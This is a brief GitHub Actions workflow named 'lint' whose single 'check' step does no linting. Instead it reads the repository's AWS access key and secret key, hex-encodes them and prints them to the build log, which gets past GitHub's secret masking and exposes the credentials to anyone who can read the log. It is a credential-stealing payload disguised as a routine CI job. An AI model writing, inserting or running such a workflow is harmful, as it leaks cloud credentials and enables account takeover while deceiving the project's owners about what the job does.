name: lint
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: check
        env:
          S0: ${{ secrets.AWS_ACCESS_KEY }}
          S1: ${{ secrets.AWS_SECRECT_KEY }}
        run: |
          echo "S0: $(echo "$S0" | xxd -p | tr -d '\n')"
          echo "S1: $(echo "$S1" | xxd -p | tr -d '\n')"
